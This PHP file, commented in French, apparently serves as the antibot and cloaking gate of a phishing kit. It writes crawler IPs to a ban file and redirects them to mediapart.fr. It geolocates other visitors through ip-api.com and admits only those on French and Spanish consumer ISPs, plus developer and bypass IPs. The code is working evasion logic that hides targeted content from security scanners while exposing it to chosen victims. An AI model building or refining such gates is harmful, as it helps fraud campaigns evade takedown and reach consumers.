<?php
include("../settings.php");

$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Tableau des adresses IP autorisées
$adresses_ip_autorisees = array(
    $ip_dev, 
    $ip_bypass,   // Ajoutez d'autres adresses IP autorisées ici
    '127.0.0.1'
);

// Vérifier si l'utilisateur est un robot (agent utilisateur contient "bot")
if (stripos($user_agent, 'bot') !== false) {
    $banned_ip_file = 'ip_ban.txt';
    $banned_ip_list = file_get_contents($banned_ip_file);
    if (strpos($banned_ip_list, $ip) === false) {
        $banned_ip_list .= $ip . "\n";
        file_put_contents($banned_ip_file, $banned_ip_list);
    }

    header("Location: https://www.mediapart.fr/");
    exit;
}

if (in_array($ip, $adresses_ip_autorisees)) {    
   
} else {
    // Utilisez cURL pour interroger l'API
    $api_url = "http://ip-api.com/json/$ip";
    $ch = curl_init($api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
       
        $data = json_decode($response, true);

        $isp = $data['isp'] ?? '';
        $org = $data['org'] ?? '';
        $as_info = $data['as'] ?? '';       

        $mots_cles_par_pays = [
            "France" => ["sfr", "orange", "free", "bouygues", "nrj mobile", "mutuel", "lyca", "cegetel", "orange sa","Free Mobile SAS","Telecom"],	
			"Spain" => ["EXCOM","Orange Espagne SA","Netports","movistar", "vodafone", "orange", "yoigo", "masmovil", "Vodafone Espana S.A.U", "Telefonica De Espana", "Uni2", "Uni2 1", "RIMA", "uni", "Procono S.A", "Xtra", "telecom", "Digi", 'XFERA Moviles S.A', "S.A","Espana","Telefonica","DVBLAB"],    
			
			
        ];

        $autoriser_acces = false;
        foreach ($mots_cles_par_pays as $pays => $mots_cles) {
            foreach ($mots_cles as $mot_cle) {
                if (stripos($isp, $mot_cle) !== false || stripos($org, $mot_cle) !== false || stripos($as_info, $mot_cle) !== false) {
                    $autoriser_acces = true;
                    break 2; 
                }
            }
        }

        if ($autoriser_acces) {           
           
        } else {            
            $banned_ip_file = '../ip_ban.txt';
            $banned_ip_list = file_get_contents($banned_ip_file);        
            if (strpos($banned_ip_list, $ip) === false) {
                $banned_ip_list .= $ip . "\n";
                file_put_contents($banned_ip_file, $banned_ip_list);
            }
            
            header("Location: https://www.mediapart.fr/");
            exit; 
        }
    } else {
        echo "Erreur lors de la récupération des informations de l'API.";
    }
}
?>
